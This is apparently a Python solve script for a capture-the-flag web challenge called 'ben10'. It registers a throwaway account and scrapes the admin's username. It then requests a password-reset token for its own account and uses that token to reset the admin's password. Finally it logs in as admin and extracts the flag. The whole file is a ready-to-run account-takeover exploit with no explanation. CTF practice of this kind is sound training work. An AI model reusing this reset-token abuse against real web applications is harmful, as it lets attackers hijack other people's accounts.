import requests
from faker import Faker
from bs4 import BeautifulSoup

fake = Faker()
user_data = {
    'username': fake.user_name(),
    'password': fake.password(),
}

s = requests.Session()

url = "http://ben10.challs.srdnlen.it:8080/"
s.post(url+"register", data=user_data)

## Admin username extraction
admin_user = BeautifulSoup(s.post(url+"login",data=user_data).text, 'html.parser').find('div', id='admin_data').get_text()

## Reset token extraction and password reset for the admin user
reset_token = BeautifulSoup(s.post(url+"reset_password", data={"username":user_data["username"]}).text, 'html.parser').find('strong').get_text()

admin_reset_data= {
    "username": admin_user,
    "reset_token": reset_token,
    "new_password": user_data["password"],
    "confirm_password": user_data["password"],
}
s.post(url+"forgot_password?token=" + reset_token, data=admin_reset_data).text

## Login with the admin user
s.post(url + "login", data={"username":admin_reset_data["username"], "password":admin_reset_data["new_password"]})

## Flag extraction
print("\nFLAG: " + BeautifulSoup(s.get(url + "image/ben10").text, 'html.parser').find('p', class_='error').get_text().split("Flag: ")[1])


